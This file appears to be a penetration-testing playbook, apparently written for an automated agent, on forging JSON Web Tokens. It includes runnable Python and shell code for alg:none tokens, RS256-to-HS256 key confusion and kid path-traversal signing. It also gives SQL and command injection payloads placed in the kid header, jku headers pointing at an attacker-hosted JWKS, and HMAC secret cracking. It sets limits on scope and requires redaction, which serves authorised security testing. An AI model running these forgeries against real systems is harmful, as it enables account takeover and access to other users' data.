# JWT Forgery Ladder

## Contents
- Baseline / oracle setup
- Rung A — `alg: none` (unsigned acceptance)
- Rung B — RS256 -> HS256 key confusion (public key as HMAC secret)
- Rung C — `kid` header injection
- Rung D — `jku` / `x5u` header injection (JWKS spoof via SSRF)
- Rung E — signature-not-verified / null-sig / weak HMAC
- Rung F — claim / cross-field confusion (signature valid, authz wrong)
- Proof to capture (safe-ladder)

The instant a JWT appears (cookie, `Authorization: Bearer`, `id_token`,
`access_token`, `?token=`, URL fragment), decode header + payload and attack the
**header algorithm and key-selection fields**. Decoding is rung 0. The finding is
a **forged token accepted on a protected route that returns data** — climb the
safe-ladder (`../../_shared/references/safe-ladder.md`) to that read, then stop.

```bash
# decode without verifying
H=$(cut -d. -f1 <<<"$JWT"); P=$(cut -d. -f2 <<<"$JWT")
echo "$H" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo "$P" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

Look at `alg`, `kid`, `jku`, `x5u`, `x5c`, `typ`, and in the payload the identity
claim (`sub`, `user_id`, `email`, `custom:*`, `role`, `tenant`, `iss`).
`iss: cognito-idp.<region>.amazonaws.com/...` -> also open `cognito-auth.md`.

> **Tooling:** `jwt_tool` is **not installed on this host**. Install it first — `git clone https://github.com/ticarpi/jwt_tool ~/tools/jwt_tool` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.

Primary tool: **`jwt_tool`** (`python3 ~/tools/jwt_tool/jwt_tool.py <JWT> -X <exploit>`),
plus the manual `python3` constructions below — those need only PyJWT, which is
already installed, so every rung in this file is runnable without `jwt_tool`.
Exploit flags: `-X a` alg:none, `-X n` null-signature,
`-X b` blank-password sign, `-X k` key-confusion (needs `-pk public.pem`),
`-X s` sign+spoof a JWKS you host (`jku`/embedded), `-X i` inject inline JWKS.

## Baseline / oracle setup

1. Establish what a valid token authorizes: send the real token to a cheap
   protected read (`/api/me`, `/api/config`, `/api/account`). That is your oracle
   — success vs 401.
2. Tamper trivially first: flip one byte of the **signature**. Still 200 = the
   server is **not verifying the signature at all** (accept anything) — highest
   value, go straight to a `sub`/`role`/`custom:*` swap.
3. Tamper one byte of the **payload**, keep the signature. 200 = signature not
   checked over that segment; 401 = signature enforced -> use the ladder below.

## Rung A — `alg: none` (unsigned acceptance)

Header `{"alg":"none","typ":"JWT"}`, keep/modify payload, **empty signature**
(token ends in a trailing `.`). Try casing variants some libs miss: `None`,
`NONE`, `nOnE`. Related CVEs: CVE-2018-1000531 (inversoft prime-jwt —
`JWTDecoder.decode` validates a header whose `alg` is `none`); CVE-2020-28042
(ServiceStack before 5.9.2 — no minimum signature length is enforced, so an
empty signature verifies; see Rung E). The key-confusion CVEs belong to Rung B,
not here — CVE-2015-9235 / CVE-2016-10555 / CVE-2016-5431 are all
asymmetric→symmetric substitution, not unsigned acceptance.

```bash
python3 - "$JWT" <<'PY'
import sys,base64,json
b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=')
p=json.loads(base64.urlsafe_b64decode(sys.argv[1].split('.')[1]+'==='))
p['sub']='<victim-id>'; p['role']='admin'; p.setdefault('email','victim@target.com')
h=b(b'{"alg":"none","typ":"JWT"}'); pl=b(json.dumps(p,separators=(',',':')).encode())
print((h+b'.'+pl+b'.').decode())
PY
```

Send the forged token to the oracle. Data back for `<victim-id>` = forgery
accepted -> High/Critical (ATO if it's an identity token).

## Rung B — RS256 -> HS256 key confusion (public key as HMAC secret)

If the token is RS256/ES256 (asymmetric), the server verifies with an RSA
**public** key. If it naively calls `verify(token, key)` with algorithm taken
from the header, you can set `alg: HS256` and sign with the *public key bytes* as
the HMAC secret — the server HMACs with the same public key and it matches.
CVEs: CVE-2015-9235 (node `jsonwebtoken` before 4.2.2), CVE-2016-10555
(`jwt-simple` 0.3.0 and earlier — `jwt.decode()` does not enforce `algorithm`),
CVE-2016-5431 (PHP JOSE Library by Gree Inc. before 2.2.1).

Get the public key:
- `GET /.well-known/jwks.json` (or `openid-configuration` -> `jwks_uri`) -> `n`,`e`
  -> rebuild PEM; or the OAuth `/oauth/token` cert; or the site TLS cert
  (`openssl s_client`); Cognito: `.../.well-known/jwks.json` under the pool `iss`.

```bash
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -X k -pk public.pem   # automated
# rebuild the PEM from the jwks n,e first:
python3 - <<'PY'
import json,base64,urllib.request
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
j=json.load(urllib.request.urlopen("https://target/.well-known/jwks.json"))["keys"][0]
n=int.from_bytes(base64.urlsafe_b64decode(j["n"]+"=="*2),"big")
e=int.from_bytes(base64.urlsafe_b64decode(j["e"]+"=="*2),"big")
pub=rsa.RSAPublicNumbers(e,n).public_key()
open("public.pem","wb").write(pub.public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
PY
# then forge with the PEM bytes as the HMAC secret. PyJWT REFUSES this
# ("asymmetric key ... should not be used as an HMAC secret"), so sign by hand:
python3 - public.pem <<'PY'
import sys,json,hmac,hashlib,base64
key=open(sys.argv[1],'rb').read()          # exact PEM bytes the server loads
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","typ":"JWT","kid":"<orig-kid>"},separators=(',',':')).encode())
p=b(json.dumps({"sub":"<victim>","role":"admin"},separators=(',',':')).encode())
s=b(hmac.new(key,h+b'.'+p,hashlib.sha256).digest())
print((h+b'.'+p+b'.'+s).decode())
PY
```

Match the exact PEM format the server loads (with/without trailing newline —
both, one usually works). Accepted -> forge any identity.

## Rung C — `kid` header injection

`kid` selects which key to verify with; if it is used unsafely it becomes:

- **Path traversal to a known-content file** used as the HMAC key. Point `kid` at
  a file whose bytes you know, then HMAC-sign with those bytes:
  `kid: "../../../../../../dev/null"` -> key is empty string; sign HS256 with `""`.
  Also `/proc/sys/kernel/randomize_va_space` (known "0\n"), a static CSS/JS asset,
  or `/dev/null`.
  ```bash
  python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
  # stdlib-only alternative (PyJWT refuses an empty HMAC key, so sign it by hand);
  # argv1 = the kid value, argv2 = the key bytes you know that file contains:
  python3 - '../../../../dev/null' '' <<'PY'
import sys,json,hmac,hashlib,base64
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","typ":"JWT","kid":sys.argv[1]},separators=(',',':')).encode())
p=b(json.dumps({"sub":"<victim>","role":"admin"},separators=(',',':')).encode())
s=b(hmac.new(sys.argv[2].encode(),h+b'.'+p,hashlib.sha256).digest())
print((h+b'.'+p+b'.'+s).decode())
PY
  ```
- **SQL injection** if `kid` indexes a DB key lookup:
  `kid: "nonexistent' UNION SELECT 'attacker_known_secret' -- -"` -> server's
  returned key = your chosen string; sign HS256 with it.
- **Command injection** if `kid` is concatenated into a shell (rare, high):
  `kid: "x|whoami"` / `kid: "x; sleep 5"` -> confirm with a timing OOB, hand to
  `rce-hunting`.
- **LFI read** — `kid` reflected into an error can leak file contents.

## Rung D — `jku` / `x5u` header injection (JWKS spoof via SSRF)

`jku`/`x5u` tell the server where to fetch the verification key. If the server
fetches the URL without an allowlist, host your own JWKS/cert, sign with your
private key, and point the header at your URL:

```bash
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -X s -ju https://ATTACKER/jwks.json  # generates keypair + jwks
# manual: `openssl genrsa -out k.pem 2048`, publish the matching JWKS (n,e,kid) on
# your host, then sign with PyJWT: jwt.encode(payload, open('k.pem').read(),
#   algorithm="RS256", headers={"kid":"<your-kid>","jku":"https://ATTACKER/jwks.json"})
```

- Straight fetch of `https://attacker/jwks.json` -> forgery + it IS an SSRF sink
  (hand to `ssrf-safe`).
- If the fetch is allowlisted to the target domain, chain: open redirect on an
  allowed host, a path-traversal-in-URL (`jku: https://target/redirect?u=attacker`),
  an on-domain file upload serving your JWKS, or `@`/`#`/`\` host-confusion in the
  URL parser (`jku: https://target@attacker/`).
- **`x5c`** embeds the cert inline: `jwt_tool.py -X i` builds a self-signed cert +
  key and embeds it — if the server trusts an embedded `x5c` without pinning the
  chain, this forges offline with no fetch.
- **`jwk`** embeds the public key itself in the header. Generate a keypair, put
  your public JWK in `{"alg":"RS256","jwk":{...}}`, sign with your private key —
  a verifier that trusts the embedded JWK accepts it, again with no fetch.
  CVE-2018-0114 is exactly this: Cisco node-jose before 0.11.0 trusted a `jwk`
  carried in the JWS header, so any token could be stripped of its signature,
  given an attacker `jwk`, and re-signed.

## Rung E — signature-not-verified / null-sig / weak HMAC

- **Null signature** — send header.payload with `alg` intact but drop or blank
  the signature (`jwt_tool.py -X n`, or just truncate the token after the second
  `.`). Some verifiers accept an empty sig for a non-none alg (CVE-2020-28042
  class).
- **Signature never checked** — from the byte-flip oracle above: if a mangled sig
  still authenticates, just edit claims freely.
- **Weak HMAC secret** — if HS256 and the secret may be a dictionary word/default
  (`secret`, `changeme`, `jwt`, app name), crack **offline** (no target traffic):

  > **Tooling:** `hashcat` is **not installed on this host**. Install it first — `sudo apt install -y hashcat` — or use the pure-`python3` alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.

  ```bash
  W=/opt/wordlists/SecLists/Passwords/scraped-JWT-secrets.txt   # then 10k-most-common.txt
  hashcat -a 0 -m 16500 "$JWT" "$W"
  # no-hashcat alternative (HMAC is cheap; a 10k-word list finishes in seconds):
  python3 - "$JWT" "$W" <<'PY'
import sys,hmac,hashlib,base64
tok=sys.argv[1]; msg,sig=tok.rsplit('.',1)
want=base64.urlsafe_b64decode(sig+'='*(-len(sig)%4))
for w in open(sys.argv[2],encoding='utf-8',errors='ignore'):
    w=w.rstrip('\n')
    if hmac.new(w.encode(),msg.encode(),hashlib.sha256).digest()==want:
        print('SECRET:',w); break
PY
  ```
  Cracked -> re-sign arbitrary claims. Offline cracking is not brute-forcing the
  target; it never touches prod.

## Rung F — claim / cross-field confusion (signature valid, authz wrong)

Even with an unbreakable signature, the *payload* may be over-trusted:

- **`sub`/path mismatch** — the route uses the path/body id, not the token `sub`.
  Send your valid token + a victim id in the path/body (this is IDOR; hand to
  `idor-bola` but the token is the auth proof here).
- **`role`/`isAdmin`/`scope`/`custom:*` self-asserted** — if the server reads a
  privilege claim from the token instead of a server-side lookup, and you can get
  a token minted with it (self-signup, Cognito `UpdateUserAttributes`, a
  `/register` that echoes fields), escalate. See `cognito-auth.md`.
- **`iss`/`aud` not pinned** — a token from a *different* issuer/pool/client is
  accepted (multi-tenant confusion). Mint one from your own tenant, present it to
  another tenant's endpoint.

## Proof to capture (safe-ladder)

- the decoded original header (redact signature) + the exact forged token header;
- the protected request with the forged token and the **response body proving a
  cross-user/tenant/admin read** (one record, PII redacted, id in `id=<n>` form);
- a negative control: the same request with a *random* signature -> 401 (proves
  the server normally enforces, and your forgery specifically bypassed it);
- for `jku`/`x5u`: your OOB listener hit (also file it as SSRF);
- revert nothing (read-only) unless you minted a self-signup account — leave a
  cleanup note. **Flag the forged token / cracked secret for rotation.**

Do not brute-force the live signature or fuzz `kid` a thousand times against
prod. Three targeted header mutations per rung; if all enforce, drop a one-line
dead-end note and rotate to the next rung, then to OAuth/Cognito/SAML.
